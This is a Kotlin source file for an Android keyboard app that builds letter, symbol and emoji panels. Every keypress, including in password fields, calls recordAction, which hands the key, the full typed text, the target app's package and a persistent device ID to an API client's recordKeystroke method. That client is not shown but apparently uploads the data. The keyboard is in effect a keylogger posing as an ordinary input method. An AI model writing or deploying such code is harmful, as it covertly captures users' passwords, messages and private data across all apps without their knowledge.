package com.keywordrecord.keyboard

import android.content.Intent
import android.inputmethodservice.InputMethodService
import android.text.Editable
import android.text.InputType
import android.text.TextWatcher
import android.util.TypedValue
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.view.inputmethod.EditorInfo
import android.widget.Button
import android.widget.EditText
import android.widget.GridLayout
import android.widget.ImageButton
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.TextView
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import com.keywordrecord.keyboard.R

class KeyboardIME : InputMethodService() {

    private lateinit var apiClient: ApiClient
    private lateinit var deviceUniqueId: String
    private var isShiftOn = false
    private var currentText = StringBuilder()
    private var currentMode = KeyboardMode.LETTERS
    private var selectedEmojiCategory = 0
    private var emojiSearchQuery = ""

    private lateinit var panelLetters: LinearLayout
    private lateinit var panelSymbols: LinearLayout
    private lateinit var panelEmoji: LinearLayout
    private lateinit var toolbarStrip: LinearLayout
    private lateinit var bottomRow: LinearLayout
    private lateinit var bottomRowEmoji: LinearLayout
    private lateinit var emojiGrid: GridLayout
    private lateinit var emojiCategoryBar: LinearLayout
    private lateinit var emojiSectionTitle: TextView
    private lateinit var emojiSearch: EditText
    private lateinit var modeSwitchBtn: Button
    private lateinit var emojiButton: ImageButton
    private lateinit var emojiTabButton: ImageButton
    private lateinit var shiftButton: ImageButton
    private lateinit var enterButton: ImageButton
    private var keyboardRoot: View? = null
    private var symbolPage = 1

    private val letterRows = listOf(
        listOf("Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P"),
        listOf("A", "S", "D", "F", "G", "H", "J", "K", "L"),
        listOf("Z", "X", "C", "V", "B", "N", "M")
    )

    private val numberHints = listOf("1", "2", "3", "4", "5", "6", "7", "8", "9", "0")

    private val symbolRowsPage1 = listOf(
        listOf("1", "2", "3", "4", "5", "6", "7", "8", "9", "0"),
        listOf("-", "/", ":", ";", "(", ")", "$", "&", "@", "\""),
        listOf(".", ",", "?", "!", "'")
    )

    private val symbolRowsPage2 = listOf(
        listOf("[", "]", "{", "}", "#", "%", "^", "*", "+", "="),
        listOf("_", "\\", "|", "~", "<", ">", "€", "£", "¥", "•"),
        listOf(".", ",", "?", "!", "'")
    )

    private enum class KeyboardMode {
        LETTERS, SYMBOLS, EMOJI
    }

    private enum class KeyStyle {
        LETTER, FUNCTION, ENTER
    }

    override fun onCreate() {
        super.onCreate()
        apiClient = ApiClient(this)
        deviceUniqueId = DeviceIdManager.getDeviceUniqueId(this)
    }

    override fun onCreateInputView(): View {
        val view = LayoutInflater.from(this).inflate(R.layout.keyboard_view, null)
        keyboardRoot = view
        setupKeyboard(view)
        setupWindowInsets(view)
        return view
    }

    private fun setupWindowInsets(root: View) {
        ViewCompat.setOnApplyWindowInsetsListener(root) { view, insets ->
            val navBarInsets = insets.getInsets(WindowInsetsCompat.Type.navigationBars()).bottom
            val spacer = view.findViewById<View>(R.id.system_nav_spacer)
            val baseSpacer = resources.getDimensionPixelSize(R.dimen.system_nav_spacer_height)
            val params = spacer.layoutParams
            params.height = baseSpacer + navBarInsets
            spacer.layoutParams = params
            insets
        }
        ViewCompat.requestApplyInsets(root)
    }

    private fun setupKeyboard(root: View) {
        panelLetters = root.findViewById(R.id.panel_letters)
        panelSymbols = root.findViewById(R.id.panel_symbols)
        panelEmoji = root.findViewById(R.id.panel_emoji)
        toolbarStrip = root.findViewById(R.id.toolbar_strip)
        bottomRow = root.findViewById(R.id.bottom_row)
        bottomRowEmoji = root.findViewById(R.id.bottom_row_emoji)
        emojiGrid = root.findViewById(R.id.emoji_grid)
        emojiCategoryBar = root.findViewById(R.id.emoji_category_bar)
        emojiSectionTitle = root.findViewById(R.id.emoji_section_title)
        emojiSearch = root.findViewById(R.id.emoji_search)
        modeSwitchBtn = root.findViewById(R.id.btn_mode_switch)
        emojiButton = root.findViewById(R.id.btn_emoji)
        emojiTabButton = root.findViewById(R.id.btn_emoji_tab)

        setupLetterPanel(root)
        setupSymbolPanel(root)
        setupEmojiLibrary()
        setupBottomRow(root)
        setupToolbar(root)
        switchMode(KeyboardMode.LETTERS)
    }

    private fun setupLetterPanel(root: View) {
        val row1 = root.findViewById<LinearLayout>(R.id.row_1)
        val row2 = root.findViewById<LinearLayout>(R.id.row_2)
        val row3 = root.findViewById<LinearLayout>(R.id.row_3)
        listOf(row1, row2, row3).forEach { row ->
            row.clipChildren = true
            row.clipToPadding = true
        }

        letterRows[0].forEachIndexed { index, key ->
            row1.addView(createLetterKey(key, numberHints[index]))
        }

        letterRows[1].forEach { key ->
            row2.addView(createLetterKey(key))
        }

        shiftButton = createIconKey(R.drawable.ic_shift, KeyStyle.FUNCTION, 1.3f)
        shiftButton.setOnClickListener { toggleShift() }
        row3.addView(shiftButton)

        letterRows[2].forEach { key ->
            row3.addView(createLetterKey(key))
        }

        val deleteButton = createIconKey(R.drawable.ic_backspace, KeyStyle.FUNCTION, 1.3f)
        deleteButton.setOnClickListener { handleDelete() }
        row3.addView(deleteButton)
    }

    private fun setupSymbolPanel(root: View) {
        rebuildSymbolPanel(root)
    }

    private fun rebuildSymbolPanel(root: View) {
        val row1 = root.findViewById<LinearLayout>(R.id.symbol_row_1)
        val row2 = root.findViewById<LinearLayout>(R.id.symbol_row_2)
        val row3 = root.findViewById<LinearLayout>(R.id.symbol_row_3)
        row1.removeAllViews()
        row2.removeAllViews()
        row3.removeAllViews()

        val rows = if (symbolPage == 1) symbolRowsPage1 else symbolRowsPage2

        rows[0].forEach { symbol ->
            row1.addView(createKeyButton(symbol, "symbol", KeyStyle.LETTER))
        }
        rows[1].forEach { symbol ->
            row2.addView(createKeyButton(symbol, "symbol", KeyStyle.LETTER))
        }

        val hashButton = createKeyButton(
            if (symbolPage == 1) "#+=" else "123",
            "symbol",
            KeyStyle.FUNCTION,
            1.35f
        )
        hashButton.setOnClickListener {
            symbolPage = if (symbolPage == 1) 2 else 1
            keyboardRoot?.let { rebuildSymbolPanel(it) }
        }
        row3.addView(hashButton)

        rows[2].forEach { symbol ->
            row3.addView(createKeyButton(symbol, "symbol", KeyStyle.LETTER, 0.95f))
        }

        val deleteButton = createIconKey(R.drawable.ic_backspace, KeyStyle.FUNCTION, 1.35f)
        deleteButton.setOnClickListener { handleDelete() }
        row3.addView(deleteButton)
    }

    private fun setupEmojiLibrary() {
        emojiCategoryBar.removeAllViews()
        val tabSize = resources.getDimensionPixelSize(R.dimen.emoji_category_size)

        EmojiRepository.categories.forEachIndexed { index, category ->
            val tab = TextView(this)
            tab.text = category.icon
            tab.gravity = Gravity.CENTER
            tab.setTextSize(TypedValue.COMPLEX_UNIT_SP, 18f)
            tab.layoutParams = LinearLayout.LayoutParams(tabSize, tabSize).apply {
                setMargins(4, 0, 4, 0)
            }
            tab.setOnClickListener {
                selectedEmojiCategory = index
                emojiSearchQuery = ""
                emojiSearch.setText("")
                renderEmojiGrid()
                updateEmojiCategorySelection()
            }
            emojiCategoryBar.addView(tab)
        }

        emojiSearch.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
            override fun afterTextChanged(s: Editable?) {
                emojiSearchQuery = s?.toString()?.trim() ?: ""
                renderEmojiGrid()
            }
        })

        emojiSearch.setOnFocusChangeListener { _, hasFocus ->
            if (hasFocus) {
                currentInputConnection?.finishComposingText()
            }
        }

        panelEmoji.findViewById<ImageButton>(R.id.btn_emoji_back).setOnClickListener {
            switchMode(KeyboardMode.LETTERS)
        }

        renderEmojiGrid()
        updateEmojiCategorySelection()
    }

    private fun renderEmojiGrid() {
        emojiGrid.removeAllViews()
        val cellSize = resources.getDimensionPixelSize(R.dimen.emoji_cell_size)
        val spec = GridLayout.spec(GridLayout.UNDEFINED, 1f)

        val emojis: List<String>
        val title: String

        if (emojiSearchQuery.isNotEmpty()) {
            emojis = EmojiRepository.categories
                .flatMap { it.emojis }
                .distinct()
                .filter { matchesEmojiSearch(it, emojiSearchQuery) }
            title = getString(R.string.emoji_search_hint)
        } else {
            val category = EmojiRepository.categories[selectedEmojiCategory]
            emojis = category.emojis
            title = category.title
        }

        emojiSectionTitle.text = title
        emojiSectionTitle.visibility = if (title.isEmpty()) View.GONE else View.VISIBLE

        emojis.forEach { emoji ->
            val button = Button(this, null, android.R.attr.borderlessButtonStyle)
            button.text = emoji
            button.setTextSize(TypedValue.COMPLEX_UNIT_SP, 22f)
            button.setTextColor(getColor(R.color.key_text))
            button.setBackgroundResource(R.drawable.key_background_selector)
            button.isAllCaps = false
            button.stateListAnimator = null
            button.elevation = 0f
            button.setPadding(0, 0, 0, 0)
            button.layoutParams = GridLayout.LayoutParams(spec, spec).apply {
                width = cellSize
                height = cellSize
                setMargins(2, 2, 2, 2)
            }
            button.setOnClickListener {
                handleCharacter(emoji, "emoji")
            }
            emojiGrid.addView(button)
        }
    }

    private fun matchesEmojiSearch(emoji: String, query: String): Boolean {
        val lowerQuery = query.lowercase()
        return emoji.contains(lowerQuery, ignoreCase = true) ||
            emoji.codePoints().anyMatch { Character.getName(it)?.lowercase()?.contains(lowerQuery) == true }
    }

    private fun updateEmojiCategorySelection() {
        for (i in 0 until emojiCategoryBar.childCount) {
            val tab = emojiCategoryBar.getChildAt(i)
            if (i == selectedEmojiCategory && emojiSearchQuery.isEmpty()) {
                tab.setBackgroundResource(R.drawable.emoji_category_active)
            } else {
                tab.background = null
            }
        }
    }

    private fun setupBottomRow(root: View) {
        modeSwitchBtn.setOnClickListener {
            when (currentMode) {
                KeyboardMode.LETTERS -> switchMode(KeyboardMode.SYMBOLS)
                KeyboardMode.SYMBOLS, KeyboardMode.EMOJI -> switchMode(KeyboardMode.LETTERS)
            }
        }

        emojiButton.setOnClickListener { openEmojiLibrary() }

        root.findViewById<Button>(R.id.btn_comma).setOnClickListener {
            handleCharacter(",", "symbol")
        }

        root.findViewById<Button>(R.id.btn_space).setOnClickListener {
            handleSpace()
        }

        root.findViewById<Button>(R.id.btn_period).setOnClickListener {
            handleCharacter(".", "symbol")
        }

        root.findViewById<ImageButton>(R.id.btn_enter).also { enterButton = it }.setOnClickListener {
            handleEnter()
        }

        root.findViewById<Button>(R.id.btn_emoji_abc).setOnClickListener {
            switchMode(KeyboardMode.LETTERS)
        }

        root.findViewById<ImageButton>(R.id.btn_emoji_delete).setOnClickListener {
            handleDelete()
        }
    }

    private fun setupToolbar(root: View) {
        root.findViewById<ImageButton>(R.id.btn_toolbar_grid).setOnClickListener {
            val intent = Intent(this, SettingsActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
        }

        root.findViewById<ImageButton>(R.id.btn_toolbar_clipboard).setOnClickListener {
            openEmojiLibrary()
        }
    }

    override fun onComputeInsets(outInsets: InputMethodService.Insets) {
        super.onComputeInsets(outInsets)
        val root = keyboardRoot ?: return
        if (root.width == 0 || root.height == 0) return
    }

    private fun openEmojiLibrary() {
        switchMode(KeyboardMode.EMOJI)
    }

    private fun switchMode(mode: KeyboardMode) {
        currentMode = mode
        panelLetters.visibility = if (mode == KeyboardMode.LETTERS) View.VISIBLE else View.GONE
        panelSymbols.visibility = if (mode == KeyboardMode.SYMBOLS) View.VISIBLE else View.GONE
        panelEmoji.visibility = if (mode == KeyboardMode.EMOJI) View.VISIBLE else View.GONE
        toolbarStrip.visibility = if (mode == KeyboardMode.EMOJI) View.GONE else View.VISIBLE
        bottomRow.visibility = if (mode == KeyboardMode.EMOJI) View.GONE else View.VISIBLE
        bottomRowEmoji.visibility = if (mode == KeyboardMode.EMOJI) View.VISIBLE else View.GONE

        if (mode == KeyboardMode.LETTERS) {
            symbolPage = 1
            emojiSearchQuery = ""
            emojiSearch.setText("")
        }

        if (mode == KeyboardMode.EMOJI) {
            renderEmojiGrid()
            updateEmojiCategorySelection()
            emojiTabButton.setBackgroundResource(R.drawable.key_shift_active_shape)
        } else {
            emojiTabButton.setBackgroundResource(R.drawable.key_function_selector)
        }

        modeSwitchBtn.text = when (mode) {
            KeyboardMode.LETTERS -> getString(R.string.key_symbols)
            KeyboardMode.SYMBOLS, KeyboardMode.EMOJI -> getString(R.string.key_abc)
        }

        emojiButton.setBackgroundResource(
            if (mode == KeyboardMode.EMOJI) R.drawable.key_shift_active_shape else R.drawable.key_function_selector
        )
    }

    private fun toggleShift() {
        isShiftOn = !isShiftOn
        shiftButton.setBackgroundResource(
            if (isShiftOn) R.drawable.key_shift_active_shape else R.drawable.key_function_selector
        )
    }

    private fun createLetterKey(letter: String, numberHint: String? = null): View {
        val keyView = LayoutInflater.from(this).inflate(R.layout.key_letter, null, false)
        val letterView = keyView.findViewById<TextView>(R.id.key_letter)
        val hintView = keyView.findViewById<TextView>(R.id.key_hint)

        letterView.text = letter.lowercase()
        if (numberHint != null) {
            hintView.text = numberHint
            hintView.visibility = View.VISIBLE
            letterView.setPadding(0, resources.getDimensionPixelSize(R.dimen.key_margin_v), 0, 0)
        }

        keyView.layoutParams = createLayoutParams(1f)
        keyView.setOnClickListener {
            val output = if (isShiftOn) letter.uppercase() else letter.lowercase()
            handleCharacter(output, "key")
            if (isShiftOn) {
                toggleShift()
            }
        }
        return keyView
    }

    private fun createIconKey(iconRes: Int, style: KeyStyle, weight: Float): ImageButton {
        val button = ImageButton(this, null, android.R.attr.borderlessButtonStyle)
        applyIconKeyStyle(button, style)
        button.setImageResource(iconRes)
        button.layoutParams = createLayoutParams(weight)
        return button
    }

    private fun createKeyButton(
        label: String,
        action: String,
        style: KeyStyle,
        weight: Float = 1f
    ): Button {
        val button = Button(this, null, android.R.attr.borderlessButtonStyle)
        applyKeyStyle(button, style)
        button.text = if (style == KeyStyle.LETTER && label.length == 1 && label[0].isLetter()) {
            label.lowercase()
        } else {
            label
        }
        button.gravity = Gravity.CENTER
        button.layoutParams = createLayoutParams(weight)
        button.setOnClickListener {
            val output = if (style == KeyStyle.LETTER && label.length == 1 && label[0].isLetter()) {
                if (isShiftOn) label.uppercase() else label.lowercase()
            } else {
                label
            }
            handleCharacter(output, action)
        }
        return button
    }

    private fun applyKeyStyle(button: Button, style: KeyStyle) {
        when (style) {
            KeyStyle.LETTER -> {
                button.setBackgroundResource(R.drawable.key_background_selector)
                button.setTextColor(getColor(R.color.key_text))
                button.setTextSize(TypedValue.COMPLEX_UNIT_PX, resources.getDimension(R.dimen.key_text_size))
            }
            KeyStyle.FUNCTION -> {
                button.setBackgroundResource(R.drawable.key_function_selector)
                button.setTextColor(getColor(R.color.key_text_secondary))
                button.setTextSize(TypedValue.COMPLEX_UNIT_PX, resources.getDimension(R.dimen.key_function_text_size))
            }
            KeyStyle.ENTER -> {
                button.setBackgroundResource(R.drawable.key_enter_selector)
                button.setTextColor(getColor(R.color.key_text))
                button.setTextSize(TypedValue.COMPLEX_UNIT_PX, resources.getDimension(R.dimen.key_function_text_size))
            }
        }
        button.isAllCaps = false
        button.stateListAnimator = null
        button.elevation = 0f
    }

    private fun applyIconKeyStyle(button: ImageButton, style: KeyStyle) {
        when (style) {
            KeyStyle.FUNCTION -> button.setBackgroundResource(R.drawable.key_function_selector)
            KeyStyle.ENTER -> button.setBackgroundResource(R.drawable.key_enter_selector)
            KeyStyle.LETTER -> button.setBackgroundResource(R.drawable.key_background_selector)
        }
        button.scaleType = ImageView.ScaleType.FIT_CENTER
        button.stateListAnimator = null
        button.elevation = 0f
        val padding = resources.getDimensionPixelSize(R.dimen.key_icon_padding)
        button.setPadding(padding, padding, padding, padding)
    }

    private fun updateEnterKeyIcon() {
        if (!::enterButton.isInitialized) return

        val editorInfo = currentInputEditorInfo ?: return
        val actionId = editorInfo.imeOptions and EditorInfo.IME_MASK_ACTION
        val variation = editorInfo.inputType and EditorInfo.TYPE_MASK_VARIATION
        val isSearchField = actionId == EditorInfo.IME_ACTION_SEARCH ||
            variation == InputType.TYPE_TEXT_VARIATION_URI

        val iconRes = when {
            isSearchField -> R.drawable.ic_search
            actionId == EditorInfo.IME_ACTION_DONE -> R.drawable.ic_enter_done
            else -> R.drawable.ic_enter_return
        }
        enterButton.setImageResource(iconRes)
        enterButton.setBackgroundResource(
            if (isSearchField) R.drawable.key_enter_circle_selector
            else R.drawable.key_enter_selector
        )
    }

    private fun createLayoutParams(weight: Float): LinearLayout.LayoutParams {
        val marginH = resources.getDimensionPixelSize(R.dimen.key_margin_h)
        val marginV = resources.getDimensionPixelSize(R.dimen.key_margin_v)
        val keyHeight = resources.getDimensionPixelSize(R.dimen.key_height)
        return LinearLayout.LayoutParams(0, keyHeight, weight).apply {
            setMargins(marginH, marginV, marginH, marginV)
        }
    }

    private fun handleCharacter(char: String, action: String) {
        currentConnection?.commitText(char, 1)
        currentText.append(char)
        recordAction(char, action)
    }

    private fun handleSpace() {
        currentConnection?.commitText(" ", 1)
        currentText.append(" ")
        recordAction(" ", "space")
    }

    private fun handleDelete() {
        val connection = currentConnection ?: return
        val selected = connection.getSelectedText(0)
        if (selected != null && selected.isNotEmpty()) {
            connection.commitText("", 1)
        } else {
            connection.deleteSurroundingText(1, 0)
            if (currentText.isNotEmpty()) {
                currentText.deleteCharAt(currentText.length - 1)
            }
        }
        recordAction("⌫", "delete")
    }

    private fun handleEnter() {
        val connection = currentConnection ?: return
        val action = currentInputEditorInfo?.imeOptions ?: EditorInfo.IME_ACTION_UNSPECIFIED
        val actionId = action and EditorInfo.IME_MASK_ACTION

        if (actionId == EditorInfo.IME_ACTION_DONE || actionId == EditorInfo.IME_ACTION_GO ||
            actionId == EditorInfo.IME_ACTION_SEARCH || actionId == EditorInfo.IME_ACTION_SEND
        ) {
            connection.performEditorAction(actionId)
            recordAction("↵", "done")
        } else {
            connection.commitText("\n", 1)
            currentText.append("\n")
            recordAction("↵", "enter")
        }
    }

    private fun recordAction(keyPressed: String, action: String) {
        val appPackage = currentInputEditorInfo?.packageName ?: "unknown"
        apiClient.recordKeystroke(
            deviceUniqueId = deviceUniqueId,
            keyPressed = keyPressed,
            fullText = currentText.toString(),
            appPackage = appPackage,
            action = action
        )
    }

    override fun onStartInput(attribute: EditorInfo?, restarting: Boolean) {
        super.onStartInput(attribute, restarting)
        if (!restarting) {
            currentText.clear()
        }
        updateEnterKeyIcon()
    }

    private val currentConnection
        get() = currentInputConnection
}
